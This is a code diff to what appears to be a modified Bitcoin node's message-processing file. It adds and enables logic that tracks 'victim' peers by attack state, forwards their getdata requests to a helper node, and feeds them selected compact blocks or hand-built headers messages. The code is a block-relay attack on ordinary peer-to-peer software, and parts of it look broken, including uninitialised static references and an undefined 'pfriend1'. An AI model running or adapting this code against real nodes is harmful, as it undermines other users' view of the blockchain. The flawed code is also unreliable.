@@ -42,6 +42,12 @@ std::chrono::time_point<std::chrono::system_clock> now;
 
 std::atomic<int64_t> nTimeBestReceived(0); // Used only to inform the wallet of when we last received a block
 
+
+//TODO: this is a sloppy way to do this, but I'm lazy and don't want to rewrite the whole thing for a one off code
+//Static file variables to hold the important bits of incoming messages
+static std::string& curr_strCommand;
+static CDataStream& curr_vRecv;
+
 struct IteratorComparator
 {
     template<typename I>
@@ -1103,6 +1109,9 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
             if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
                 std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
                 pvictimState->getdata_request.insert(inv.hash.ToString());
+
+                //TODO: send the request
+                connman->PushMessage(pfriend1, msgMaker.Make(curr_strCommand, curr_vRecv));
             }
         }
     }
@@ -1522,6 +1531,9 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         LogPrintf("dropmessagestest DROPPING RECV MESSAGE\n");
         return true;
     }
+
+    curr_strCommand = strCommand;
+    curr_vRecv = vRecv;
 
     if (!(pfrom->GetLocalServices() & NODE_BLOOM) &&
         (strCommand == NetMsgType::FILTERLOAD ||
@@ -2479,7 +2491,8 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
             CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
 
-            if (pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
+            if (pvictimState->attack_state == 0
+                && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
                 if (pvictim) {
                     connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
                     pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
@@ -2488,28 +2501,28 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                               cmpctblock.header.GetHash().ToString());
                 }
             }
-//            else if (pvictimState->attack_state == 1
-//                       && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
-//                if (pvictim) {
-//                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
-//                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
-//                              pvictim->addr.ToString());
-//                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
-//                }
-//            } else if (pvictimState->attack_state == 1
-//                       && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
-//                       && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
-//                if (pvictim) {
-//                    // construct a headers message and send directly to the victim
-//                    std::vector <CBlock> headers_to_victim;
-//                    headers_to_victim.push_back(cmpctblock.header);
-//                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
-//                    pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
-//                    pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
-//                    LogPrintf("VIC %s - sending a headers message (constructed from a compact block) %s directly\n",
-//                              pvictim->addr.ToString(), cmpctblock.header.GetHash().ToString());
-//                }
-//            }
+            else if (pvictimState->attack_state == 1
+                       && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
+                if (pvictim) {
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
+                              pvictim->addr.ToString());
+                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
+                }
+            } else if (pvictimState->attack_state == 1
+                       && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
+                       && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
+                if (pvictim) {
+                    // construct a headers message and send directly to the victim
+                    std::vector <CBlock> headers_to_victim;
+                    headers_to_victim.push_back(cmpctblock.header);
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
+                    pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
+                    pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
+                    LogPrintf("VIC %s - sending a headers message (constructed from a compact block) %s directly\n",
+                              pvictim->addr.ToString(), cmpctblock.header.GetHash().ToString());
+                }
+            }
         }
 
         bool received_new_header = false;
